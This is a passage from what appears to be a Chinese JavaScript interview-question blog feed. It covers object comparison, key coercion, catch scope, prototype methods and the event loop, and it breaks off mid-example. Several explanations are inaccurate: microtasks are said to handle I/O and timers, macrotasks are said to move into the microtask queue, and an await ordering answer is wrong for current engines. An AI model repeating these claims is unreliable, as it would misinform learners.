class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>参考答案</code></p><p>undefined<br>{n:2}</p><p>首先，a和b同时引用了{n:2}对象，接着执行到a.x = a = {n：2}语句，尽管赋值是从右到左的没错，但是.的优先级比=要高，所以这里首先执行a.x，相当于为a（或者b）所指向的{n:1}对象新增了一个属性x，即此时对象将变为{n:1;x:undefined}。之后按正常情况，从右到左进行赋值，此时执行a ={n:2}的时候，a的引用改变，指向了新对象{n：2},而b依然指向的是旧对象。之后执行a.x = {n：2}的时候，并不会重新解析一遍a，而是沿用最初解析a.x时候的a，也即旧对象，故此时旧对象的x的值为{n：2}，旧对象为 {n:1;x:{n：2}}，它被b引用着。<br>后面输出a.x的时候，又要解析a了，此时的a是指向新对象的a，而这个新对象是没有x属性的，故访问时输出undefined；而访问b.x的时候，将输出旧对象的x的值，即{n:2}。</p><h3 id="7、下面代码的输出是什么"><a href="#7、下面代码的输出是什么" class="headerlink" title="7、下面代码的输出是什么?"></a>7、下面代码的输出是什么?</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">checkAge</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">===</span> <span class="token punctuation">{</span> age<span class="token punctuation">:</span> <span class="token number">18</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"You are an adult!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">==</span> <span class="token punctuation">{</span> age<span class="token punctuation">:</span> <span class="token number">18</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"You are still an adult."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`Hmm.. You don't have an age I guess`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">checkAge</span><span class="token punctuation">(</span><span class="token punctuation">{</span> age<span class="token punctuation">:</span> <span class="token number">18</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>参考答案</code></p><blockquote><p>Hmm.. You don’t have an age I guess</p></blockquote><p>在比较相等性，原始类型通过它们的值进行比较，而对象通过它们的引用进行比较。<code>JavaScript</code>检查对象是否具有对内存中相同位置的引用。</p><p>我们作为参数传递的对象和我们用于检查相等性的对象在内存中位于不同位置，所以它们的引用是不同的。</p><p>这就是为什么<code>{ age: 18 } === { age: 18 }</code>和 <code>{ age: 18 } == { age: 18 }</code>返回 <code>false</code>的原因。</p><h3 id="8、下面代码的输出是什么"><a href="#8、下面代码的输出是什么" class="headerlink" title="8、下面代码的输出是什么?"></a>8、下面代码的输出是什么?</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"c"</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">set</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>obj<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>obj<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">set</span><span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">set</span><span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>参考答案</code></p><blockquote><p><code>true</code> <code>true</code> <code>false</code> <code>true</code></p></blockquote><p>所有对象键（不包括<code>Symbols</code>）都会被存储为字符串，即使你没有给定字符串类型的键。 这就是为什么<code>obj.hasOwnProperty（&#39;1&#39;）</code>也返回<code>true</code>。</p><p>上面的说法不适用于<code>Set</code>。 在我们的<code>Set</code>中没有<code>“1”</code>：<code>set.has（&#39;1&#39;）</code>返回<code>false</code>。 它有数字类型<code>1</code>，<code>set.has（1）</code>返回<code>true</code>。</p><h3 id="9、下面代码的输出是什么"><a href="#9、下面代码的输出是什么" class="headerlink" title="9、下面代码的输出是什么?"></a>9、下面代码的输出是什么?</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// example 1</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> b<span class="token operator">=</span><span class="token string">'123'</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span>  a<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'c'</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token comment" spellcheck="true">// example 2</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> b<span class="token operator">=</span><span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  a<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'c'</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token comment" spellcheck="true">// example 3</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> b<span class="token operator">=</span><span class="token punctuation">{</span>key<span class="token punctuation">:</span><span class="token string">'123'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token punctuation">{</span>key<span class="token punctuation">:</span><span class="token string">'456'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  a<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'c'</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>参考答案</code></p><p>这题考察的是对象的键名的转换。</p><ul><li>对象的键名只能是字符串和 Symbol 类型。</li><li>其他类型的键名会被转换成字符串类型。</li><li>对象转字符串默认会调用 toString 方法。</li></ul><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// example 1</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> b<span class="token operator">=</span><span class="token string">'123'</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// c 的键名会被转换成字符串'123'，这里会把 b 覆盖掉。</span>a<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'c'</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 输出 c</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// example 2</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> b<span class="token operator">=</span><span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// b 是 Symbol 类型，不需要转换。</span>a<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// c 是 Symbol 类型，不需要转换。任何一个 Symbol 类型的值都是不相等的，所以不会覆盖掉 b。</span>a<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'c'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 输出 b</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// example 3</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> b<span class="token operator">=</span><span class="token punctuation">{</span>key<span class="token punctuation">:</span><span class="token string">'123'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token punctuation">{</span>key<span class="token punctuation">:</span><span class="token string">'456'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// b 不是字符串也不是 Symbol 类型，需要转换成字符串。</span><span class="token comment" spellcheck="true">// 对象类型会调用 toString 方法转换成字符串 [object Object]。</span>a<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// c 不是字符串也不是 Symbol 类型，需要转换成字符串。</span><span class="token comment" spellcheck="true">// 对象类型会调用 toString 方法转换成字符串 [object Object]。这里会把 b 覆盖掉。</span>a<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'c'</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 输出 c</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="10、下面代码的输出是什么"><a href="#10、下面代码的输出是什么" class="headerlink" title="10、下面代码的输出是什么?"></a>10、下面代码的输出是什么?</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> x<span class="token punctuation">,</span> y<span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">x</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">(</span>x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>y <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>参考答案</code></p><blockquote><p><code>1</code> <code>undefined</code> <code>2</code></p></blockquote><p><code>catch</code>块接收参数<code>x</code>。当我们传递参数时，这与变量的<code>x</code>不同。这个变量<code>x</code>是属于<code>catch</code>作用域的。</p><p>之后，我们将这个块级作用域的变量设置为<code>1</code>，并设置变量<code>y</code>的值。 现在，我们打印块级作用域的变量<code>x</code>，它等于<code>1</code>。</p><p>在<code>catch</code>块之外，<code>x</code>仍然是<code>undefined</code>，而<code>y</code>是<code>2</code>。 当我们想在<code>catch</code>块之外的<code>console.log(x)</code>时，它返回<code>undefined</code>，而<code>y</code>返回<code>2</code>。</p><h3 id="11、下面代码的输出结果是什么？"><a href="#11、下面代码的输出结果是什么？" class="headerlink" title="11、下面代码的输出结果是什么？"></a>11、下面代码的输出结果是什么？</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    Foo<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>Foo<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">}</span>Foo<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">}</span>Foo<span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>obj<span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Foo<span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>参考答案</code>  </p><blockquote><p>输出顺序是 4 2 1 </p></blockquote><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    Foo<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 以上只是 Foo 的构建方法，没有产生实例，此刻也没有执行</span>Foo<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 现在在 Foo 上挂载了原型方法 a ，方法输出值为 3</span>Foo<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 现在在 Foo 上挂载了直接方法 a ，输出值为 4</span>Foo<span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 立刻执行了 Foo 上的 a 方法，也就是刚刚定义的，所以</span><span class="token comment" spellcheck="true">// # 输出 4</span><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/* 这里调用了 Foo 的构建方法。Foo 的构建方法主要做了两件事：1. 将全局的 Foo 上的直接方法 a 替换为一个输出 1 的方法。2. 在新对象上挂载直接方法 a ，输出值为 2。*/</span>obj<span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 因为有直接方法 a ，不需要去访问原型链，所以使用的是构建方法里所定义的 this.a，</span><span class="token comment" spellcheck="true">// # 输出 2</span>Foo<span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 构建方法里已经替换了全局 Foo 上的 a 方法，所以</span><span class="token comment" spellcheck="true">// # 输出 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 面试题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>setTimeout,promise,async await的区别</title>
      <link href="2019/09/14/awat/"/>
      <url>2019/09/14/awat/</url>
      
        <content type="html"><![CDATA[<p>一道面试题引发的血案，下面进入主题：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 今日头条面试题</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">async1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async1 start'</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">async2</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async1 end'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">async2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'async2'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script start'</span><span class="token punctuation">)</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'settimeout'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token function">async1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise1'</span><span class="token punctuation">)</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise2'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'script end'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目的本质，就是考察<code>setTimeout</code>、<code>promise</code>、<code>async await</code>的实现及执行顺序，以及JS的事件循环的相关问题。</p><p>答案：</p><pre class="line-numbers language-js"><code class="language-js">script startasync1 startasync2promise1script endasync1 endpromise2settimeout<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再看一个经典的例子：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> p <span class="token operator">=</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">await</span> p<span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'await end'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'then 1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'then 2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>答案：</p><pre class="line-numbers language-js"><code class="language-js">then <span class="token number">1</span>then <span class="token number">2</span><span class="token keyword">await</span> end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>你答对了吗？这里涉及到<code>Microtasks</code>、<code>Macrotasks</code>、event loop 以及 JS 的异步运行机制。</p><h3 id="一、event-loop"><a href="#一、event-loop" class="headerlink" title="一、event loop"></a>一、event loop</h3><p>JS主线程不断的循环往复的从任务队列中读取任务，执行任务，其中运行机制称为事件循环（event loop）。</p><h3 id="二、Microtasks、Macrotasks（task）"><a href="#二、Microtasks、Macrotasks（task）" class="headerlink" title="二、Microtasks、Macrotasks（task）"></a>二、Microtasks、Macrotasks（task）</h3><p>在高层次上，JavaScript 中有 <strong>microtasks</strong> 和 <strong>macrotasks（task）</strong>，它们是异步任务的一种类型，<code>Microtasks</code>的优先级要高于<code>macrotasks</code>，microtasks 用于处理 I/O 和计时器等事件，每次执行一个。microtask 为 <code>async</code>/<code>await</code> 和 Promise 实现延迟执行，并在每个 task 结束时执行。在每一个事件循环之前，microtask 队列总是被清空（执行）。</p><p><a href="https://camo.githubusercontent.com/daa23b38107f20829df9c655fb700a17917f2ca6/68747470733a2f2f76382e6a732e636e2f5f696d672f666173742d6173796e632f6d6963726f7461736b732d76732d7461736b732e737667" target="_blank" rel="noopener"><img src="https://camo.githubusercontent.com/daa23b38107f20829df9c655fb700a17917f2ca6/68747470733a2f2f76382e6a732e636e2f5f696d672f666173742d6173796e632f6d6963726f7461736b732d76732d7461736b732e737667" alt="microtasks-vs-tasks"></a></p><p><strong>图1: 微任务和任务之间的区别</strong></p><p>下面是它们所包含的api：</p><ul><li>microtasks<ul><li>process.nextTick</li><li>promise</li><li>Object.observe (废弃)</li><li>MutationObserver</li></ul></li><li>macrotasks<ul><li>setTimeout</li><li>setImmediate</li><li>setInterval</li><li>I/O</li><li>UI 渲染</li></ul></li></ul><p><strong>注意：</strong></p><ol><li>每一个 event loop 都有一个 microtask queue</li><li>每个 event loop 会有一个或多个macrotask queue ( 也可以称为task queue )</li><li>一个任务 task 可以放入 macrotask queue 也可以放入 microtask queue中</li><li>每一次event loop，会首先执行 microtask queue， 执行完成后，会提取 macrotask queue 的一个任务加入 microtask queue， 接着继续执行microtask queue，依次执行下去直至所有任务执行结束。</li></ol><h3 id="三、异步运行机制"><a href="#三、异步运行机制" class="headerlink" title="三、异步运行机制"></a>三、异步运行机制</h3><p>我们已知， JS 是单线程的，至于为什么，详见 <a href="https://github.com/LuNaHaiJiao/blog/issues/11" target="_blank" rel="noopener">JS 基础之异步（一）</a>。</p><p>下面看一个例子：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 1. 开始执行</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//     2. 打印 1</span><span class="token function">setTimeout</span><span class="token 